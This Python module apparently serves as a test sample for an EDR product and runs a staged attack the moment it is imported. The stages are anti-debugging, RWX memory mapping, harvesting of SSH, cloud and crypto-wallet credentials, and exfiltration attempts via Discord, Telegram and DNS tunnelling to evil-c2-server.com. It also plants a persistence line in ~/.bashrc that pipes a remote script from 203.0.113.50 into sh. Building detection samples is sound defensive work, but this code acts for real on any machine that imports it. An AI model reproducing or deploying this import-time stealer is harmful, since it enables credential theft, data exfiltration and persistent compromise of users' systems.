# probe-alpha — test artifact for kojuto EDR validation.
# Import-time payload: exercises OS-gated and date-gated detection paths.

import platform
import os
import socket
import ctypes
import struct

# ============================================================
# Phase 2: Import-time payload (OS-gated, date-gated)
# Exercises kojuto's import-phase detection with multi-OS probing.
# ============================================================


def _recon():
    """IP recon via ipinfo.io — triggers data_exfiltration (NEW)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        # DNS resolution of ipinfo.io will be captured by sendto monitor
        sock.connect(("ipinfo.io", 443))
        sock.close()
    except Exception:
        pass


def _exfil_discord(data):
    """Discord webhook exfil — triggers data_exfiltration (NEW).

    Primary info-stealer exfil channel. DNS resolution of discord.com
    is captured by the connected-socket sendto parser.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect(("discord.com", 443))
        sock.sendall(b"POST /api/webhooks/000000000000000000/FAKE HTTP/1.1\r\n")
        sock.close()
    except Exception:
        pass


def _exfil_telegram(data):
    """Telegram Bot API exfil — triggers data_exfiltration (NEW)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        # DNS resolution of api.telegram.org captured by sendto monitor
        sock.connect(("api.telegram.org", 443))
        sock.sendall(b"POST /bot0000000000:FAKE/sendMessage HTTP/1.1\r\n")
        sock.close()
    except Exception:
        pass


def _read_wallets():
    """Crypto wallet harvesting — triggers credential_access (NEW).

    Targets the exact paths added in the kojuto config update:
    Solana, Ethereum, Bitcoin, Electrum, Exodus, Atomic, Monero.
    """
    home = os.path.expanduser("~")
    targets = [
        # Crypto wallets (primary supply chain attack targets)
        os.path.join(home, ".solana", "id.json"),
        os.path.join(home, ".ethereum", "keystore"),
        os.path.join(home, ".bitcoin", "wallet.dat"),
        os.path.join(home, ".electrum", "wallets", "default_wallet"),
        os.path.join(home, ".monero", "keys"),
        os.path.join(home, ".exodus", "exodus.wallet"),
        os.path.join(home, ".atomic", "Local Storage", "leveldb"),
        os.path.join(home, ".config", "solana", "cli", "config.yml"),
        os.path.join(home, ".config", "Ledger Live", "app.json"),
        # Browser extension wallet data
        os.path.join(home, ".config", "google-chrome", "Default",
                     "Local Storage", "leveldb"),
        os.path.join(home, ".config", "BraveSoftware", "Brave-Browser",
                     "Default", "IndexedDB"),
    ]

    stolen = {}
    for path in targets:
        try:
            with open(path, "r") as f:
                stolen[path] = f.read(4096)
        except Exception:
            pass

    return stolen


def _read_credentials():
    """Classic credential harvesting — triggers credential_access (OLD)."""
    home = os.path.expanduser("~")
    targets = [
        os.path.join(home, ".ssh", "id_rsa"),
        os.path.join(home, ".ssh", "id_ed25519"),
        os.path.join(home, ".aws", "credentials"),
        os.path.join(home, ".git-credentials"),
        os.path.join(home, ".netrc"),
        os.path.join(home, ".config", "gh", "hosts.yml"),
        os.path.join(home, ".gnupg", "secring.gpg"),
        os.path.join(home, ".docker", "config.json"),
        os.path.join(home, ".kube", "config"),
    ]

    for path in targets:
        try:
            with open(path, "r") as f:
                f.read(4096)
        except Exception:
            pass


def _anti_debug():
    """ptrace(PTRACE_TRACEME) — triggers evasion (OLD).

    Real malware uses this to detect strace/gdb and suppress
    malicious behavior when being analyzed.
    """
    try:
        PTRACE_TRACEME = 0
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        result = libc.ptrace(PTRACE_TRACEME, 0, 0, 0)
        if result == -1:
            # Being traced — real malware would exit here
            pass
    except Exception:
        pass


def _shellcode_exec():
    """ctypes mmap RWX shellcode injection — triggers memory_execution (NEW).

    Simulates the pattern of allocating writable+executable
    memory via ctypes, writing shellcode, and jumping to it. This bypasses
    execve-based detection entirely.

    The shellcode here is a harmless NOP+RET (does nothing).
    The detection target is the mmap(PROT_READ|PROT_WRITE|PROT_EXEC) syscall.
    """
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)

        # mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
        PROT_READ = 0x1
        PROT_WRITE = 0x2
        PROT_EXEC = 0x4
        MAP_PRIVATE = 0x02
        MAP_ANONYMOUS = 0x20

        libc.mmap.restype = ctypes.c_void_p
        libc.mmap.argtypes = [
            ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
            ctypes.c_int, ctypes.c_int, ctypes.c_long,
        ]

        addr = libc.mmap(
            None, 4096,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1, 0,
        )

        if addr and addr != ctypes.c_void_p(-1).value:
            # Write harmless NOP sled + RET (x86_64: 0x90 = NOP, 0xC3 = RET)
            # We don't actually execute it — the mmap syscall is the detection target.
            shellcode = b"\x90" * 16 + b"\xc3"
            ctypes.memmove(addr, shellcode, len(shellcode))

            # Clean up
            libc.munmap(addr, 4096)
    except Exception:
        pass


def _dns_tunnel_exfil(data):
    """DNS tunneling exfiltration — triggers dns_tunneling (OLD).

    Encodes stolen data as base64 in subdomain labels, mimicking
    real supply chain attack exfil seen in the wild.
    """
    import base64
    try:
        encoded = base64.b64encode(data.encode()).decode().rstrip("=")
        # High-entropy subdomain label (> 3.5 bits/char Shannon entropy)
        domain = f"{encoded[:60]}.x.evil-c2-server.com"
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        # Build minimal DNS query (wire format)
        labels = domain.split(".")
        qname = b""
        for label in labels:
            qname += struct.pack("B", len(label)) + label.encode()
        qname += b"\x00"
        # DNS header: random ID, standard query, 1 question
        header = struct.pack(">HHHHHH", 0x1337, 0x0100, 1, 0, 0, 0)
        query = header + qname + struct.pack(">HH", 1, 1)  # A record, IN class
        sock.sendto(query, ("8.8.8.8", 53))
        sock.close()
    except Exception:
        pass


# ============================================================
# Payload execution (gated on platform + CI environment)
# ============================================================

def _run():
    system = platform.system()
    ci = os.environ.get("CI", "").lower() == "true"

    # Stage 1: Anti-debug check + shellcode injection
    _anti_debug()
    _shellcode_exec()

    # Stage 1.5: Anti-forensics — create, execute, delete (3-step pattern)
    # The unlink MUST be in finally so it runs even if execve fails (EACCES).
    # Real malware does the same — cleanup runs regardless of execution success.
    tmp_path = "/tmp/.kojuto-test-payload"
    try:
        import subprocess
        with open(tmp_path, "w") as f:
            f.write("#!/bin/sh\necho pwned\n")
        os.chmod(tmp_path, 0o755)
        try:
            subprocess.run([tmp_path], capture_output=True, timeout=2)
        except Exception:
            pass
    except Exception:
        pass
    finally:
        try:
            os.unlink(tmp_path)
        except Exception:
            pass

    # Stage 2: Recon
    _recon()

    # Stage 3: Credential + wallet harvesting
    _read_credentials()
    wallet_data = _read_wallets()

    # Stage 4: Exfiltrate via multiple channels
    _exfil_discord(str(wallet_data))
    _exfil_telegram(str(wallet_data))
    _dns_tunnel_exfil(os.environ.get("AWS_SECRET_ACCESS_KEY", "no-key"))

    # Stage 5: Platform-gated persistence
    if system == "Linux" or system == "Darwin":
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, "a") as f:
                f.write(
                    '\n# systemd-helper\n'
                    'curl -s http://203.0.113.50:8443/update.sh | sh\n'
                )
        except Exception:
            pass


# Auto-execute on import
try:
    _run()
except Exception:
    pass
